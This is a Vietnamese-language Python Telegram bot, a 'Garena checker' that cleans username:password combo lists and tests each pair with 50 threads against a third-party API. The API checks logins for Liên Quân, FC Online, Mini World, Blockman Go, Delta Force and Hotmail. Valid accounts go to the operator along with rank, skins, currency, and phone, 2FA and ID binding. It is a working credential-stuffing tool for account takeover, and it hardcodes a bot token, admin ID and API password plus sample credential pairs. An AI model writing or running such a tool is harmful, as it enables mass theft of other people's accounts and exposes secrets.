# bot.py - GARENA CHECKER BOT 24/7 - LỌC TK MK TỪ TXT
# Token: 6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA
# Admin: 5736655322
# API: thaituduc / thaituduc - KHÔNG GIỚI HẠN
# /loc -> Lọc tk mk từ file txt, chỉ hiện user:pass
import subprocess
import sys
import importlib

def install_package(package_name):
    try:
        importlib.import_module(package_name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--no-cache-dir"])
        except:
            pass

for pkg in ["requests", "colorama", "pyTelegramBotAPI"]:
    install_package(pkg)

import requests
import threading
import queue
import time
import json
import os
import sys
import re
import telebot
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# ========== CẤU HÌNH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"

API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_SERVICE = "lienquan"
DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 60
DEFAULT_RETRIES = 3
DEFAULT_DELAY = 0.05

INPUT_FILE = "accounts.txt"
OUTPUT_FILE = "hits.txt"
DEAD_FILE = "dead.txt"
FILTERED_FILE = "filtered_accounts.txt"

CUSTOM_PROXY = ""
HOTMAIL_KEYWORD = ""

SERVICE_ROUTES = {
    "lienquan":   {"route": "/api/lienquan",   "desc": "Check Liên Quân + FC Online"},
    "miniworld":  {"route": "/api/miniworld",  "desc": "Check Mini World"},
    "blockmango": {"route": "/api/blockmango", "desc": "Check Blockman Go"},
    "deltaforce": {"route": "/api/deltaforce", "desc": "Check Delta Force (Garena SSO)"},
    "hotmail":    {"route": "/api/hotmail",    "desc": "Check Hotmail + Tìm email"},
    "fc":         {"route": "/api/fc",         "desc": "Check FC Online riêng"},
    "fullpack":   {"route": "/api/fullpack",   "desc": "Check tất cả service qua Garena"}
}

account_queue = queue.Queue()
file_lock = threading.Lock()
stats_lock = threading.Lock()
stop_event = threading.Event()
checking = False

stats = {
    "total": 0,
    "checked": 0,
    "hits": 0,
    "dead": 0,
    "unknown": 0,
    "errors": 0,
    "start_time": None
}

waiting_service = None
waiting_loc = False
filtered_accounts = []

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

def print_info(msg):
    print(f"[*] {msg}")

def print_success(msg):
    print(f"[+] {msg}")

def print_error(msg):
    print(f"[!] {msg}")

def is_admin(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

# ========== GỌI API ==========
def check_account_api(username, password, service, proxy="", keyword=""):
    route = SERVICE_ROUTES[service]["route"]
    url = f"{API_BASE}{route}"
    
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        "tk": username,
        "mk": password
    }
    
    if proxy:
        params["proxy"] = proxy
    
    if service == "hotmail" and keyword:
        params["keyword"] = keyword
    
    session = requests.Session()
    
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = session.get(url, params=params, timeout=DEFAULT_TIMEOUT)
            
            if resp.status_code == 200:
                try:
                    return resp.json()
                except json.JSONDecodeError:
                    return {"raw": resp.text, "status": "unknown"}
            elif resp.status_code == 429:
                time.sleep(3)
            else:
                time.sleep(1)
                
        except requests.exceptions.Timeout:
            time.sleep(2)
        except requests.exceptions.ConnectionError:
            time.sleep(3)
        except requests.exceptions.RequestException:
            time.sleep(1)
    
    return {"status": "error", "message": "Request failed after retries"}

# ========== PHÂN TÍCH KẾT QUẢ ==========
def parse_result(result):
    if not isinstance(result, dict):
        return "unknown", str(result)
    
    status = str(result.get("status", "")).lower()
    success = result.get("success", False)
    message = str(result.get("message", ""))
    data = result.get("data", None)
    
    if "status" in result and isinstance(result["status"], bool):
        if result["status"]:
            return "hit", data if data else json.dumps(result, ensure_ascii=False)
        else:
            return "dead", message
    
    hit_keywords = ["success", "valid", "hit", "live", "ok", "true", "đúng", "hợp lệ"]
    dead_keywords = ["fail", "invalid", "dead", "die", "sai", "không đúng", "error", "expired"]
    
    status_lower = status.lower()
    message_lower = message.lower()
    
    for kw in hit_keywords:
        if kw in status_lower or kw in message_lower:
            return "hit", data if data else json.dumps(result, ensure_ascii=False)
    
    for kw in dead_keywords:
        if kw in status_lower or kw in message_lower:
            return "dead", message if message else json.dumps(result, ensure_ascii=False)
    
    if data:
        return "hit", data
    
    return "unknown", json.dumps(result, ensure_ascii=False)

# ========== FORMAT HIT ĐẸP ==========
def format_hit_dep(username, password, data):
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except:
            pass
    
    if not isinstance(data, dict):
        return f"━━━━━━━━━ ✅ HIT ━━━━━━━━━\n🔑 {username}:{password}\n━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    uid = data.get("uid", "N/A")
    region = data.get("region", "N/A")
    shells = data.get("shells", data.get("so", 0))
    nap_so = data.get("nap_so", data.get("last_recharge", "01/01/1970"))
    email_verified = data.get("email_verified", False)
    mobile_bound = data.get("mobile_bound", False)
    password_set = data.get("password_set", False)
    fb_linked = data.get("fb_linked", False)
    fb_id = data.get("fb_id", data.get("fb", ""))
    aov_banned = data.get("aov_banned", "NO")
    last_login = data.get("last_login", "N/A")
    created = data.get("created", data.get("tao_gr", "N/A"))
    aov_name = data.get("aov_name", data.get("name", ""))
    aov_rank = data.get("aov_rank", data.get("rank", "N/A"))
    aov_level = data.get("aov_level", data.get("level", 0))
    aov_total_skins = data.get("aov_total_skins", data.get("skin", 0))
    aov_total_champs = data.get("aov_total_champs", data.get("hero", 0))
    qh = data.get("qh", data.get("quan_he", 0))
    cccd = data.get("cccd", data.get("cmnd", "No"))
    authen = data.get("authen", data.get("2fa", "No"))
    aov_ss_list = data.get("aov_ss_list", [])
    
    email_str = f"Yes [{email_verified}]" if email_verified else "No"
    sdt_str = f"Yes [{mobile_bound}]" if mobile_bound else "No"
    pass_str = "Yes" if password_set else "No"
    fb_str = f"YES [{fb_id}]" if fb_linked else "NO"
    band_str = "YES" if str(aov_banned).upper() == "YES" else "NO"
    cccd_str = "Yes" if cccd and cccd != "No" else "No"
    authen_str = "Yes" if authen and authen != "No" else "No"
    
    ss_str = ""
    if aov_ss_list:
        ss_str = f"\n✨ <b>SS:</b> {len(aov_ss_list)} [{', '.join(aov_ss_list[:5])}{'...' if len(aov_ss_list)>5 else ''}]"
    
    return f"""
━━━━━━━━━ ✅ <b>HIT</b> ━━━━━━━━━
🔑 <code>{username}:{password}</code>
👤 UID: <code>{uid}</code>
🌐 Region: <code>{region}</code>
💲 Sò: <code>{shells}</code>
💰 Nạp sò: <code>{nap_so}</code>
📩 EMAIL: {email_str}
📱 SĐT: {sdt_str}
🛡 PASS: {pass_str}
🔗 FB: {fb_str}
🚫 BAND: {band_str}
⏰ Login cuối: <code>{last_login}</code>
📅 Tạo GR: <code>{created}</code>
🔥 NAME: <code>{aov_name}</code>
👑 RANK: <code>{aov_rank}</code>
✨ LEVEL: <code>{aov_level}</code>
💎 SKIN: <code>{aov_total_skins}</code>
💪 HERO: <code>{aov_total_champs}</code>
⚡️ QH: <code>{qh}</code>
📄 CCCD: {cccd_str}
🛡 Authen: {authen_str}{ss_str}
━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def format_dead_dep(username, password):
    return f"""
━━━━━━━━━ ❌ <b>DEAD</b> ━━━━━━━━━
🔑 <code>{username}:{password}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━
"""

# ========== LƯU KẾT QUẢ ==========
def save_hit_txt(username, password):
    with file_lock:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password}\n")

def save_dead_txt(username, password):
    with file_lock:
        with open(DEAD_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{username}:{password}\n")

# ========== LỌC TK MK - CHỈ GIỮ USER:PASS ==========
def loc_tk_mk(content):
    """Lọc chỉ giữ user:pass từ nội dung"""
    accounts = []
    seen = set()
    
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        
        if not line:
            continue
        
        user = None
        pwd = None
        
        if ':' in line:
            parts = line.split(':', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '|' in line:
            parts = line.split('|', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        elif '/' in line:
            parts = line.split('/', 1)
            user = parts[0].strip()
            pwd = parts[1].strip()
        
        if user and pwd:
            user = re.sub(r'[^\w.@-]', '', user)
            pwd = pwd.strip()
            
            if len(user) > 0 and len(pwd) > 0:
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
    
    return accounts

# ========== CHECK NHIỀU ACCOUNTS ==========
def check_multi_accounts(chat_id, accounts, service):
    global checking, stats
    
    if checking:
        bot.send_message(chat_id, "⚠️ Đang check rồi!")
        return
    
    stats = {
        "total": len(accounts),
        "checked": 0,
        "hits": 0,
        "dead": 0,
        "unknown": 0,
        "errors": 0,
        "start_time": time.time()
    }
    
    checking = True
    stop_event.clear()
    
    bot.send_message(chat_id, f"🔍 Check {len(accounts)} acc với {service}...")
    
    def process_account(user, pwd):
        if stop_event.is_set():
            return
        
        result = check_account_api(user, pwd, service, CUSTOM_PROXY, HOTMAIL_KEYWORD)
        category, detail = parse_result(result)
        
        if category == "hit":
            save_hit_txt(user, pwd)
        elif category == "dead":
            save_dead_txt(user, pwd)
        
        with stats_lock:
            stats["checked"] += 1
            if category == "hit":
                stats["hits"] += 1
                msg = format_hit_dep(user, pwd, detail)
                try:
                    bot.send_message(chat_id, msg)
                except:
                    pass
            elif category == "dead":
                stats["dead"] += 1
                if len(accounts) <= 5:
                    try:
                        bot.send_message(chat_id, format_dead_dep(user, pwd))
                    except:
                        pass
            else:
                stats["unknown"] += 1
    
    threads_list = []
    for user, pwd in accounts:
        t = threading.Thread(target=process_account, args=(user, pwd))
        t.start()
        threads_list.append(t)
        
        if len(threads_list) >= DEFAULT_THREADS:
            for th in threads_list:
                th.join()
            threads_list = []
    
    for t in threads_list:
        t.join()
    
    elapsed = time.time() - stats["start_time"]
    checking = False
    
    result_msg = f"""
✅ <b>CHECK XONG!</b>
📊 Đã check: <code>{stats['checked']}/{stats['total']}</code>
🔴 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⏱ Thời gian: <code>{elapsed:.1f}s</code>
"""
    bot.send_message(chat_id, result_msg)
    
    if stats["hits"] > 0:
        with open(OUTPUT_FILE, 'rb') as f:
            bot.send_document(chat_id, f, caption="hits.txt")

# ========== LỆNH /loc - LỌC TK MK TỪ TXT ==========
@bot.message_handler(commands=['loc'])
def cmd_loc(message):
    if not is_admin(message.chat.id):
        return
    
    global waiting_loc
    
    waiting_loc = True
    bot.reply_to(message, """
📌 <b>LỌC TK MK TỪ TXT</b>

Gửi file .txt hoặc nội dung chứa tk mk
Bot sẽ lọc chỉ giữ lại: <code>user:pass</code>

VD:
ZzkeconzZ:thanhoppa2001
anhduckim1:kimanhduc1
trannamtrungzzz:cuong2001
""")

# ========== XỬ LÝ FILE - LỌC TK MK ==========
@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_admin(message.chat.id):
        return
    
    global waiting_loc, filtered_accounts, waiting_service
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        content = downloaded_file.decode('utf-8', errors='ignore')
        accounts = loc_tk_mk(content)
        
        if not accounts:
            bot.reply_to(message, "❌ Không tìm thấy user:pass!")
            return
        
        # Lưu vào file filtered
        with open(FILTERED_FILE, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")
        
        filtered_accounts = accounts
        
        # Hiển thị tk mk
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        
        result_msg = f"""
✅ <b>LỌC XONG! ({len(accounts)} tk)</b>

<code>{preview}</code>
"""
        
        if len(accounts) > 20:
            result_msg += f"\n... còn {len(accounts) - 20} dòng"
        
        # Nếu đang chờ check
        if waiting_service:
            service = waiting_service
            waiting_service = None
            waiting_loc = False
            bot.send_message(message.chat.id, result_msg)
            bot.send_message(message.chat.id, f"🔍 Đang check {service}...")
            threading.Thread(target=check_multi_accounts, args=(message.chat.id, accounts, service)).start()
        elif waiting_loc:
            waiting_loc = False
            bot.send_message(message.chat.id, result_msg)
            bot.send_message(message.chat.id, "📌 Dùng /check lienquan để check")
        else:
            bot.send_message(message.chat.id, result_msg)
    
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {e}")

# ========== XỬ LÝ TEXT - LỌC TK MK ==========
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_admin(message.chat.id):
        return
    
    global waiting_loc, filtered_accounts, waiting_service
    
    text = message.text.strip()
    
    if text.startswith('/'):
        return
    
    accounts = loc_tk_mk(text)
    
    if not accounts:
        return
    
    # Lưu
    with open(FILTERED_FILE, 'w', encoding='utf-8') as f:
        for user, pwd in accounts:
            f.write(f"{user}:{pwd}\n")
    
    filtered_accounts = accounts
    
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
    
    result_msg = f"""
✅ <b>LỌC XONG! ({len(accounts)} tk)</b>

<code>{preview}</code>
"""
    
    if len(accounts) > 20:
        result_msg += f"\n... còn {len(accounts) - 20} dòng"
    
    # Nếu đang chờ check
    if waiting_service:
        service = waiting_service
        waiting_service = None
        waiting_loc = False
        bot.send_message(message.chat.id, result_msg)
        bot.send_message(message.chat.id, f"🔍 Đang check {service}...")
        threading.Thread(target=check_multi_accounts, args=(message.chat.id, accounts, service)).start()
    elif waiting_loc:
        waiting_loc = False
        bot.send_message(message.chat.id, result_msg)
        bot.send_message(message.chat.id, "📌 Dùng /check lienquan để check")
    else:
        bot.send_message(message.chat.id, result_msg)

# ========== LỆNH /check ==========
@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not is_admin(message.chat.id):
        return
    
    global waiting_service, checking, filtered_accounts
    
    if checking:
        bot.reply_to(message, "⚠️ Đang check rồi!")
        return
    
    parts = message.text.split()
    
    if len(parts) >= 2 and parts[1] in SERVICE_ROUTES:
        waiting_service = parts[1]
        
        # Nếu đã có filtered_accounts thì check luôn
        if filtered_accounts:
            service = waiting_service
            waiting_service = None
            bot.reply_to(message, f"🔍 Check {len(filtered_accounts)} acc với {service}...")
            threading.Thread(target=check_multi_accounts, args=(message.chat.id, filtered_accounts, service)).start()
        else:
            bot.reply_to(message, f"""
📌 <b>Gửi file .txt hoặc nội dung tk mk</b>
Bot sẽ lọc và check {parts[1]} ngay
""")
        return
    
    # /check không có service -> check filtered
    if filtered_accounts:
        bot.reply_to(message, f"🔍 Check {len(filtered_accounts)} acc...")
        threading.Thread(target=check_multi_accounts, args=(message.chat.id, filtered_accounts, DEFAULT_SERVICE)).start()
    else:
        bot.reply_to(message, "❌ Chưa có tk mk!\nDùng /loc để lọc hoặc /check lienquan rồi gửi tk mk")

# ========== LỆNH /start ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_admin(message.chat.id):
        return
    bot.send_message(message.chat.id, """
🤖 <b>GARENA CHECKER BOT 24/7</b>

✅ API: thaituduc | KHÔNG GIỚI HẠN

📌 <b>LỆNH:</b>

1️⃣ <b>/loc</b>
→ Gửi file .txt hoặc nội dung
→ Bot lọc chỉ giữ <code>user:pass</code>

2️⃣ <b>/check lienquan</b>
→ Check Liên Quân
→ Gửi file hoặc tk mk

3️⃣ <b>/check fc</b>
→ Check FC Online

4️⃣ <b>/check fullpack</b>
→ Check tất cả

📋 <b>SERVICES:</b>
lienquan, miniworld, blockmango, deltaforce, hotmail, fc, fullpack

📌 <b>LỆNH KHÁC:</b>
/hits - Tải hits.txt
/dead - Tải dead.txt
/status - Trạng thái
/stop - Dừng
""")

# ========== LỆNH KHÁC ==========
@bot.message_handler(commands=['hits'])
def cmd_hits(message):
    if not is_admin(message.chat.id):
        return
    try:
        with open(OUTPUT_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="hits.txt")
    except FileNotFoundError:
        bot.reply_to(message, "❌ Chưa có hits!")

@bot.message_handler(commands=['dead'])
def cmd_dead(message):
    if not is_admin(message.chat.id):
        return
    try:
        with open(DEAD_FILE, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="dead.txt")
    except FileNotFoundError:
        bot.reply_to(message, "❌ Chưa có dead!")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_admin(message.chat.id):
        return
    
    if not checking:
        bot.reply_to(message, "💤 Bot rảnh")
        return
    
    msg = f"📊 Đã check: {stats['checked']}/{stats['total']}\n🔴 HIT: {stats['hits']}\n❌ DEAD: {stats['dead']}"
    bot.send_message(message.chat.id, msg)

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not is_admin(message.chat.id):
        return
    stop_event.set()
    global checking, waiting_service, waiting_loc
    checking = False
    waiting_service = None
    waiting_loc = False
    bot.reply_to(message, "🛑 Đã dừng!")

# ========== MAIN ==========
def main():
    print("=" * 60)
    print("    GARENA CHECKER BOT 24/7")
    print("    LỌC TK MK + CHECK ACC")
    print("=" * 60)
    
    try:
        bot.send_message(ADMIN_CHAT_ID, "🤖 Bot 24/7 đã khởi động!\n\n/loc - Lọc tk mk\n/check lienquan - Check LQ")
    except Exception as e:
        print(f"[!] Không gửi được: {e}")
    
    print("[*] Bot đang chạy 24/7...")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot đã dừng!")
        sys.exit(0)
